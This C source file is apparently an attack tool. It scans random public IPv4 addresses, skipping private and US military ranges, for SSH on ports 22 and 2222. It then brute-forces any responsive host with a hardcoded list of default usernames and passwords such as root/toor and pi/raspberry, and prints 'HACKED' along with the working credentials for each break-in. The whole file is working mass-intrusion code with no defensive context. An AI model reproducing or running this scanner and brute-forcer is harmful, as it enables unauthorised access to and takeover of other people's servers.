#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <pthread.h>
#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define SIZE_PORTS 2         
#define BUFFER_SIZE 4096     
#define TIMEOUT_SCAN 20

struct cock
{
    int fd, iport, status;   
    struct sockaddr_in addr;
    time_t timec;
};
enum myconnections
{
    mCreated = 0,
    mConnecting = 1,
    mGrabingBanner = 2
};
int SIZE_QUEUE = 16384;   
int SSH_SIZE_QUEUE = 16384;              
uint16_t PORTS[SIZE_PORTS] = {22, 2222}; 
struct cock* scs;                        
char *buffer; 
void addToQUEUE(struct sockaddr_in*addr); 

void ext(const char *err) 
{
    printf("FATAL: %s\n", err);
    exit(0);
}
uint32_t rip_me()    
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;          
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    } while (o1 == 127 ||                               // 127.0.0.0/8      - Loopback
             (o1 == 0) ||                               // 0.0.0.0/8        - Invalid address space
             (o1 == 3) ||                               // 3.0.0.0/8        - General Electric Company
             (o1 == 15 || o1 == 16) ||                  // 15.0.0.0/7       - Hewlett-Packard Company
             (o1 == 56) ||                              // 56.0.0.0/8       - US Postal Service
             (o1 == 10) ||                              // 10.0.0.0/8       - Internal network
             (o1 == 192 && o2 == 168) ||                // 192.168.0.0/16   - Internal network
             (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
             (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
             (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
             (o1 == 198 && o2 >= 18 && o2 < 20) ||    // 198.18.0.0/15    - IANA Special use
             (o1 >= 224) ||                           // 224.*.*.*+       - Multicast
             (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 
             || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 49 
             || o1 == 50 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );
    return INET_ADDR(o1, o2, o3, o4);
}


void cock_init(uint32_t ip, struct cock *dt) 
{
    if ((dt->fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
      ext("socket_oaoa"); 
    fcntl(dt->fd, F_SETFL, O_NONBLOCK | fcntl(dt->fd, F_GETFL, 0)); 
    dt->iport = 0;                                           
    dt->addr.sin_addr.s_addr = ip;
    dt->addr.sin_port = PORTS[0];
    dt->addr.sin_family = AF_INET;
    bzero(dt->addr.sin_zero, 8); 
    dt->status = mCreated;
}
void recycle(struct cock *dt)
{ 
    if (++dt->iport >= SIZE_PORTS)
      return cock_init(rip_me(), dt); 
    dt->addr.sin_port = PORTS[dt->iport];
    if ((dt->fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
      ext("socket"); 
    fcntl(dt->fd, F_SETFL, O_NONBLOCK | fcntl(dt->fd, F_GETFL, 0)); 
    dt->status = mCreated;
}
void expandLimitFD()
{
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);

    rlim_t myLimit =SIZE_QUEUE + SSH_SIZE_QUEUE+ 128; // + SIZE_QUEUE_SSH  
    if (rl.rlim_cur >= myLimit)
        return;
    rl.rlim_cur = myLimit;
    if (rl.rlim_max <= myLimit)
    {
        rl.rlim_max = rl.rlim_cur + 5;
        if (setrlimit(RLIMIT_NOFILE, &rl) < 0)
            ext("COULDn't expand FD.\n Make my code BETTER!!!\n");
    }
    else
        setrlimit(RLIMIT_NOFILE, &rl);
}
void scan_init()
{
    expandLimitFD(); 
    for (int i = 0; i < SIZE_PORTS; i++)
        PORTS[i] = htons(PORTS[i]);       
    scs = (struct cock *)malloc(sizeof(struct cock) * SIZE_QUEUE);  
    for (int ind = 0; ind < SIZE_QUEUE; ind++)
        cock_init(rip_me(), scs + ind);           
}
void *scan_loop(void *Pargs)
{
    int cnr, err = 0; 
    struct cock *dt;
    buffer = (char *)malloc(BUFFER_SIZE + 1);
    const char *hi = "pm\0";
    for (int x = 0;; x++){
        if (x >= SIZE_QUEUE){
            x = 0; 
        }


        usleep(10);
        dt = &(scs[x]);

        if (dt->status != mGrabingBanner)
            cnr = connect(dt->fd, (struct sockaddr *)&(dt->addr), sizeof(struct sockaddr_in));
        if(dt->status == mCreated){
            dt->status = mConnecting;
            dt->timec = time(NULL);
        }else if(dt->status == mConnecting){
            err = errno;
            if ((cnr == -1 && err == EISCONN) || cnr == 0)//CONNECTED!!
            {
                write(dt->fd, hi, 3);
                dt->timec = time(NULL);
                dt->status = mGrabingBanner;
            }
            else if(time(NULL) - dt->timec >= TIMEOUT_SCAN)
                goto new_ip; 
            else if(cnr == -1 && err == 0)
                continue; 
            else if (err == ECONNREFUSED || (cnr == -1 && err != EINPROGRESS && err != EALREADY) ) // Ошибка подключения 
                goto new_ip;
        }else if(dt->status == mGrabingBanner){
            err = read(dt->fd, buffer, BUFFER_SIZE);
            if (err > 0)
            {
                buffer[err] = '\0';
                if (strstr(buffer, "SSH") != NULL) // нашли ssh
                    addToQUEUE(&(dt->addr)); 
                goto new_ip;
            }
            else if (time(NULL) - dt->timec >= TIMEOUT_SCAN)
                goto new_ip;
        }
        continue;
    new_ip:
        close(dt->fd);
        recycle(dt); 
    }
    return NULL;
}

#include <libssh/libssh.h>


struct commonssh
{
  struct sockaddr_in addr; 
  char *ip;
  uint16_t port;

  int state, is_password_auth, tries; 
  time_t ltime;
  ssh_session session;
  uint16_t userInd, passInd;
  struct commonssh *next;
};
struct QUEUE_comonssh
{
  pthread_mutex_t m;
  struct commonssh *first, *last;
  int state, maxSize, size;
};
enum
{
  SSH_CREATED = 0,
  SSH_CONNECTING = 1,
  SSH_BRUTING = 2,
  SSH_DEAD = 3,
};
#define SSH_CNCT_TIMEOUT 30
#define SSH_AUTH_TIMEOUT 30
#define WAIT 4
struct QUEUE_comonssh QUEUE_SSH;
const char *bruteUsernames[] = {"root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser"};
int sizeUsernames = 17;
const char *brutePasswords[] = {"root", "toor", "raspberry", "dietpi", "test", "uploader", "password", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine"};
int sizePasswords = 22;

void *loop_brute(void *pdata); 
void init_brute(); 
#define IS_DEBUG 1
int main()
{
  scan_init(); 
  init_brute(); 
  pthread_t scan_thd, brute_thd; 
  pthread_create(&scan_thd, NULL, scan_loop, NULL); 
  pthread_create(&brute_thd, NULL, loop_brute, NULL); 

	pthread_detach(scan_thd);
	pthread_detach(brute_thd);
#ifdef IS_DEBUG
  char pause; 
  while(1){
    scanf("%c", &pause); 
    system("clear");

    
    pthread_mutex_lock(&QUEUE_SSH.m); 
    struct commonssh *cur = QUEUE_SSH.first; 
    while(cur != NULL){
      printf("%s: ui: %d, pi: %d, state: %d\n", cur->ip, cur->userInd, cur->passInd, cur->state); 
      cur = cur->next; 
    }
    pthread_mutex_unlock(&QUEUE_SSH.m); 
  }
#else 
  while(1)
    sleep(1000); 
#endif
}
int ssh_connect_nonblock(struct commonssh *cssh)
{
  if ((cssh->state == SSH_CREATED))
  {
    ssh_options_set(cssh->session, SSH_OPTIONS_HOST, cssh->ip);
    ssh_options_set(cssh->session, SSH_OPTIONS_PORT, &cssh->port);
    ssh_set_blocking(cssh->session, 0);
    cssh->state = SSH_CONNECTING; 
  }
  if (cssh->ltime == 0)
    cssh->ltime = time(NULL);
  return ssh_connect(cssh->session);
}
void fuck_out(struct commonssh *prev, struct commonssh **current, int tries){
  struct commonssh *cur = (*current);
  if(tries != -1 || tries < 10 || cur == NULL || prev == NULL){
    if(cur->session != NULL){
      ssh_disconnect(cur->session); 
      ssh_free(cur->session); 
      cur->session = NULL; 
    }
    cur->state = SSH_CREATED; 
    return; 
  }
  pthread_mutex_lock(&(QUEUE_SSH.m));
  prev->next = cur->next;
  if (QUEUE_SSH.first == cur && QUEUE_SSH.last == cur)
  {
    QUEUE_SSH.first = NULL;
    QUEUE_SSH.last = NULL;
    (*current) = NULL;
  }
  else if (QUEUE_SSH.last == cur)
  {
    QUEUE_SSH.last = prev;
    (*current) = prev;
    prev->next = NULL;
  }
  else if (QUEUE_SSH.first == cur)
  {
    QUEUE_SSH.first = cur->next;
    (*current) = NULL;
  }
  else
  {
    (*current) = prev;
  }
  QUEUE_SSH.size--;
  pthread_mutex_unlock(&(QUEUE_SSH.m));
  if (cur->session != NULL)
  {
    ssh_disconnect(cur->session); 
    ssh_free(cur->session); 
  }
  cur->session = NULL;
  free(cur);
}
struct commonssh *getFirst()
{
  struct commonssh *ret;
  pthread_mutex_lock(&(QUEUE_SSH.m));
  ret = QUEUE_SSH.first;
  pthread_mutex_unlock(&(QUEUE_SSH.m));
  return ret;
}
void init_brute(){
  QUEUE_SSH.first = NULL;
  QUEUE_SSH.last = NULL;
  QUEUE_SSH.maxSize = SSH_SIZE_QUEUE;
  QUEUE_SSH.size = 0;
}
void addToQUEUE(struct sockaddr_in*addr){
  pthread_mutex_lock(&(QUEUE_SSH.m));
  if (QUEUE_SSH.size >= QUEUE_SSH.maxSize){
    pthread_mutex_unlock(&(QUEUE_SSH.m));
    return; 
  }
  struct commonssh *ptr = (struct commonssh *)calloc(1, sizeof(struct commonssh));
  ptr->ip = strdup(inet_ntoa(addr->sin_addr)); 
  ptr->addr = (*addr); 
  ptr->state = SSH_CREATED; 
  ptr->port = ntohs(addr->sin_port);
  if (QUEUE_SSH.first == NULL)
    QUEUE_SSH.first = ptr;
  else
    QUEUE_SSH.last->next = ptr;
  QUEUE_SSH.last = ptr;
  QUEUE_SSH.size++;
  pthread_mutex_unlock(&(QUEUE_SSH.m));
}
void *loop_brute(void *pdata)
{
  int rc = 1, sizB = 1;
  struct commonssh *prev = NULL, *cur = NULL;
  for (;;)
  {
    cur = getFirst();
    if (cur == NULL)
    {
      sleep(1); // IF THERE IS NO ANY IPS YET
      continue;
    }
    prev = cur;
    while (cur != NULL)
    {
      switch (cur->state)
      {
      case SSH_CREATED:
      case SSH_CONNECTING:
        if(cur->session == NULL)
          cur->session = ssh_new(); 
        rc = ssh_connect_nonblock(cur);
        if (rc != SSH_OK){
          if (( rc == SSH_AGAIN && (time(NULL) - cur->ltime >= SSH_CNCT_TIMEOUT)) || rc != SSH_AGAIN){
            fuck_out(prev, &cur, ++cur->tries); 
            break; 
          }
          break; 
        }
        cur->ltime = 0; 
        cur->state = SSH_BRUTING; 
        break; 
      case SSH_BRUTING:
        if(cur->ltime == 0)
          cur->ltime = time(NULL); 
        rc =  ssh_userauth_password(cur->session, bruteUsernames[cur->userInd], brutePasswords[cur->passInd]); 
        if(rc  == SSH_AUTH_SUCCESS){
          //HACKED
          printf("HACKED: %s:%d:%s:%s\n", inet_ntoa(cur->addr.sin_addr), cur->port, bruteUsernames[cur->userInd], brutePasswords[cur->passInd]); 
          fuck_out(prev, &cur, -1); 
          break; 
        }else if(rc == SSH_AUTH_AGAIN){
          if( (time(NULL) - cur->ltime) >= SSH_AUTH_TIMEOUT)
            fuck_out(prev, &cur, ++cur->tries); 
          break; 
        }else if(cur->is_password_auth == 0){
          const char*err = ssh_get_error(cur->session), *err2; 
          err2 = strstr(err,"for 'password'");
          if(err2!=NULL){
            if(strstr(err2, "password")!=NULL)
              cur->is_password_auth = 1; 
            else{
              fuck_out(prev, &cur, -1);   
              break;            
            }
          }
        }else if(rc == SSH_AUTH_ERROR){
          fuck_out(prev, &cur, ++cur->tries); 
          break; 
        }else if(rc == SSH_AUTH_DENIED){
          cur->passInd++; 
          if(cur->passInd >= sizeUsernames){
            cur->userInd++; 
            cur->passInd = 0; 
            if(cur->userInd>=sizePasswords){
              fuck_out(prev, &cur, -1); 
              break; 
            }
          }
          cur->tries = 0; 
          ssh_disconnect(cur->session);
          ssh_free(cur->session); 
          cur->session = NULL; 
          cur->state = SSH_CREATED; 
          break; 
        }
      case SSH_DEAD:
        fuck_out(prev, &cur, -1); 
        break; 
      }
      if(cur != NULL){
        prev = cur; 
        cur = cur->next; 
      }
    }
  }
}
